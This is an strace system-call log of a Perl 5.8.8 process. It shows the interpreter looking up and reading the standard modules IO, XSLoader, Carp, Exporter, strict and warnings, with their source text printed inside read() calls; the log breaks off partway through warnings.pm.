6989  07:16:29.060074 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060087 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060100 stat64("/usr/lib/perl5/IO.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060113 stat64("/usr/lib/perl5/IO.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060126 stat64("/usr/share/perl5/IO.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060138 stat64("/usr/share/perl5/IO.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060150 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060163 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
6989  07:16:29.060184 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
6989  07:16:29.060198 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9aec28) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.060209 _llseek(6, 0, [0], SEEK_CUR) = 0
6989  07:16:29.060232 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
6989  07:16:29.060289 stat64("/etc/perl/XSLoader.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060303 stat64("/etc/perl/XSLoader.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060316 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060329 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060343 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060356 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060374 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060386 stat64("/usr/lib/perl5/XSLoader.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060399 stat64("/usr/share/perl5/XSLoader.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060411 stat64("/usr/share/perl5/XSLoader.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060424 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.060437 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
6989  07:16:29.060457 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
6989  07:16:29.060471 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ae778) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.060482 _llseek(8, 0, [0], SEEK_CUR) = 0
6989  07:16:29.060500 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
6989  07:16:29.060750 brk(0x8195000)    = 0x8195000
6989  07:16:29.061069 _llseek(8, 3407, [3407], SEEK_SET) = 0
6989  07:16:29.061088 _llseek(8, 0, [3407], SEEK_CUR) = 0
6989  07:16:29.061099 close(8)          = 0
6989  07:16:29.061145 stat64("/etc/perl/Carp.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061161 stat64("/etc/perl/Carp.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061174 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061187 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061201 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061214 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061228 stat64("/usr/lib/perl5/Carp.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061239 stat64("/usr/lib/perl5/Carp.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061252 stat64("/usr/share/perl5/Carp.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061264 stat64("/usr/share/perl5/Carp.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061277 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061290 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061304 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061317 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
6989  07:16:29.061338 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
6989  07:16:29.061353 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ae778) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.061365 _llseek(8, 0, [0], SEEK_CUR) = 0
6989  07:16:29.061383 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
6989  07:16:29.061829 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
6989  07:16:29.061857 read(8, "", 4096) = 0
6989  07:16:29.061869 close(8)          = 0
6989  07:16:29.061891 stat64("/etc/perl/Exporter.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061905 stat64("/etc/perl/Exporter.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061918 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061931 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061945 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061958 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061972 stat64("/usr/lib/perl5/Exporter.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061984 stat64("/usr/lib/perl5/Exporter.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.061997 stat64("/usr/share/perl5/Exporter.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.062026 stat64("/usr/share/perl5/Exporter.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.062041 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.062060 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.062093 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.062123 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
6989  07:16:29.062145 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
6989  07:16:29.062159 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ae778) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.062171 _llseek(8, 0, [0], SEEK_CUR) = 0
6989  07:16:29.062188 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
6989  07:16:29.062643 _llseek(8, 2217, [2217], SEEK_SET) = 0
6989  07:16:29.062661 _llseek(8, 0, [2217], SEEK_CUR) = 0
6989  07:16:29.062672 close(8)          = 0
6989  07:16:29.062747 stat64("/etc/perl/strict.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.062764 stat64("/etc/perl/strict.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.062777 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.062790 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.062804 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.062817 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.062831 stat64("/usr/lib/perl5/strict.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.062843 stat64("/usr/lib/perl5/strict.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.062860 stat64("/usr/share/perl5/strict.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.062872 stat64("/usr/share/perl5/strict.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.062885 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.062898 stat64("/usr/lib/perl/5.8/strict.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.062911 stat64("/usr/share/perl/5.8/strict.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.062924 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
6989  07:16:29.062945 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
6989  07:16:29.062960 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ae778) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.062972 _llseek(8, 0, [0], SEEK_CUR) = 0
6989  07:16:29.062991 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
6989  07:16:29.063191 _llseek(8, 598, [598], SEEK_SET) = 0
6989  07:16:29.063206 _llseek(8, 0, [598], SEEK_CUR) = 0
6989  07:16:29.063216 close(8)          = 0
6989  07:16:29.063255 stat64("/etc/perl/warnings.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.063270 stat64("/etc/perl/warnings.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.063284 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.063297 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.063311 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.063324 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.063338 stat64("/usr/lib/perl5/warnings.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.063350 stat64("/usr/lib/perl5/warnings.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.063363 stat64("/usr/share/perl5/warnings.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.063375 stat64("/usr/share/perl5/warnings.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.063388 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.063400 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.063414 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.063427 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
6989  07:16:29.063448 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
6989  07:16:29.063494 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ae778) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.063507 _llseek(8, 0, [0], SEEK_CUR) = 0
6989  07:16:29.063542 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # 